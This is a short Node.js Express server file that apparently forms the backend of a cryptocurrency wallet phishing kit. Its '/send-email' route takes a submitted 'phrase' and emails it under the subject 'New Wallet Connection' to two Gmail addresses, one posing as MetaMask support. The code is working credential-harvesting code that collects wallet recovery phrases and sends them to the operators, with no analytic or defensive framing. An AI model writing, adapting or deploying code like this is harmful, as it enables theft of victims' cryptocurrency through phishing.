const express = require("express");
const nodemailer = require("nodemailer");
require("dotenv").config(); // Load environment variables from .env file
const cors = require("cors");

const app = express();
const PORT = 5000; // Adjust the port if necessary

// Middleware to parse JSON body
app.use(express.json());
app.use(cors()); // Add CORS middleware to handle cross-origin requests

// Root route
app.get("/", (req, res) => {
    res.send("SMTP Server is running! Use POST /send-email to send emails.");
});

// Route to handle form submissions
app.post("/send-email", async (req, res) => {
    const { phrase, email } = req.body;

    // Validate request body
    if (!phrase || !email) {
        return res.status(400).json({ error: "All fields are required." });
    }

    // Email format validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        return res.status(400).json({ error: "Invalid email format." });
    }

    try {
        // Configure nodemailer transporter
        const transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: "oriyebakap6@gmail.com", // Your Gmail address
                pass: process.env.GMAIL_PASSWORD, // Use environment variable for password
            },
        });

        // Email options
        const mailOptions = {
            from: `"Wallet Connection" <${email}>`, // Sender email address
            to: "oriyebakap6@gmail.com, assistmetamask@gmail.com", // Your email to receive the form data
            subject: "New Wallet Connection",
            text: `Phrase: ${phrase}`, // Email body
        };

        // Send email
        const info = await transporter.sendMail(mailOptions);

        console.log("Email sent successfully:", info.response);
        res.status(200).json({ message: "Email sent successfully!" });
    } catch (error) {
        console.error("Error sending email:", error);
        res.status(500).json({ error: "Failed to send email." });
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
